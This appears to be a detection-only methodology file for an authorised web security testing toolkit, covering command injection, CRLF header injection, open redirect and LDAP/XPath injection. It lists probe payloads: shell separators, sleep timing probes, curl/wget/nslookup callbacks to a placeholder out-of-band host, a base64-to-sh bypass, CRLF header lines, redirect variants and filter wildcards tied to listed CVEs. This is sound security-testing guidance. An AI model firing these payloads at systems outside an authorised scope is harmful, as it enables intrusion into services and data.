# Command / header injection + open redirect (detection-only reference)

Covers the "other injection" bucket of `docs/methodology-classes.md`: OS command injection, header
injection (CRLF), and open redirect. Driven by `tools/repeater.js` (tamper + `--diff`) and
`tools/oob.js` (blind channels); SSTI/deser/NoSQLi/LFI/proto-pollution have their own files.

> **Scope discipline.** `node tools/scope-guard.js check <url>` first (exit 0). Detection uses a
> BENIGN marker only (echo of a unique token, `whoami`-level echo, arithmetic time cap ≤ 7s).
> Never destructive commands, never write/remove — an actual RCE payload chain is confirm-tier
> (`--confirm "<reason>"` + explicit per-action approval, knowledge.md rule 2).
>
> **Detection-only.** Wildcards and boolean oracles only; reading a directory entry or a certificate
> the filter should have excluded is the furthest a detection run goes.

## 1. OS command injection

Probe every value that plausibly reaches a shell (ping/traceroute/export/diagnostic fields, filename
arguments, webhook fetchers). Baseline → separator probe → echo marker → (if blind) time/OOB.

**Separators & metacharacters** (substitute `MARKER` with a unique token per run):

```
; echo MARKER
| echo MARKER
|| echo MARKER
&& echo MARKER
& echo MARKER
`echo MARKER`
$(echo MARKER)
'\n echo MARKER
;echo$IFS$1MARKER
```

**Blind confirmation (no reflection):**

- Time-based: `; sleep 5` / `| sleep 5` / `$(sleep 5)` — cap the sleep (≤ 7s), 2 probes max,
  compare against baseline latency (`repeater.js` timing). `sleep` payload = `time` class proof.
- OOB: `; curl http://<oob-marker>` / `$(wget <oob-marker>)` — generate with
  `node tools/oob.js marker`, inject, then `node tools/oob.js hits`. The callback is the proof
  (works for DNS-only egress too: `nslookup <marker-host>` variants).

**Windows targets:** `& echo MARKER`, `| echo MARKER`, `` ` `` no — use `%COMSPEC%` style: `& whoami`,
`| whoami`, `&& ping -n 5 <ip>` for timing.

**Filter bypass candidates** (only after a clean probe fails — never blind spray): case variation
(`EcHo`), quote insertion (`ec''ho`), `$IFS` instead of spaces, newline prefix, base64 round-trip
(`echo <b64> | base64 -d | sh` — detection only, echo MARKER inside).

Result requirement: `whoami`/`echo MARKER` level output or OOB hit = `triggered` minimum; full
command control = `exploited` after explicit approval of the follow-up action only.

## 2. Header injection / CRLF (response splitting)

Inject `%0d%0a` (raw `\r\n` via `repeater.js --header` or URL-encoded in parameters) to smuggle a
response header or split the response. Benign proof = inject a **custom header** you can read back:

```
%0d%0aX-Stavros-Marker: MARKER
%0d%0a%0d%0aMARKERBODY
```

Where to probe: any parameter reflected into a response header — `Location` (redirects), `Set-Cookie`
(name/value), `Content-Disposition` (filename), log-viewer `User-Agent`/`X-Forwarded-For` (second-
order), PDF/export filename fields.

Positive evidence: the injected header appears in the raw response (`repeater.js` raw view), or the
body split exposes `MARKERBODY`. A reflected `%0d%0a` **without** header materialization = `suspected`
(encoded output, not a split). Second-order (log poisoning) needs the log surface reachable — record
where the payload lands.

## 3. Open redirect

Parameter reflects into `Location` / meta refresh / JS redirect. Benign proof = redirect to an
in-scope host you control the path of (or `//<in-scope-host>`), NEVER to an external attacker domain:

```
//<in-scope-host>
/<in-scope-host>
https://<in-scope-host>
/%5c<in-scope-host>
///<in-scope-host>
/%09/<in-scope-host>
```

Evidence: response status 3xx with `Location` pointing where you asked (`repeater.js --show-body` +
raw headers). Chain note: open redirect + OAuth `redirect_uri` or token-in-URL = chain candidate for
`chain.js` (report the pair, don't exploit the chain without approval).

## 4. 2026: LDAP and XPath injection

Directory and XML-query filters are string-built more often than SQL is — the operators
(`(|(uid=*))`, `//item[@id='…']`) accept metacharacters that never reach a SQL parser. Three
probe shapes cover the rows below:

- **Result widening** in a search/filter parameter: `*)(uid=*` against a baseline, and read the row
  count rather than the page;
- **Session bypass** where an identifier reaches a bind filter: `*` in the identity field, and look
  for a changed error class (never a real account);
- **XML-query injection**: `' or '1'='1` / `'] | //* | //*['` in the search field — an error page
  naming XPath is `triggered`, extra results are `exploited`.

| Technique | CVE / advisory | Date | Affected | Probe |
|---|---|---|---|---|
| LDAP filter injection (`_queryId`) | CVE-2026-41573 | 2026-06 | OpenAM ≤16.0.6 | `*)(uid=*` vs baseline result count |
| LDAP injection in MSISDN auth | CVE-2026-46619 | 2026-06 | OpenAM CE ≤16.0.6 | `*` as identity; error-class change |
| LDAP filter in XKMS repo | CVE-2026-44930 | 2026-05 | CXF 4.2.0; 4.1.0–<4.1.6; <3.6.11 (fix 4.2.1/4.1.6/3.6.11) | wildcard in cert lookup |
| XPath injection | CVE-2026-44962 | 2026-05 | Plesk Obsidian 18.x <18.0.75.1 | `' or '1'='1` in APS catalog search |

Record with class `"injection"`: `cwe: "CWE-90"` for LDAP, `"CWE-643"` for XPath. A wildcard that
only widens the search is `triggered`; reading an entry the filter should have excluded is
`exploited`.

## Reporting

Class names (record-finding.js): `injection` (command/header/LDAP/XPath), `redirect` (open redirect).
Attach the raw request/response as `poc`; verification level per knowledge.md (unverified =
`suspected`).
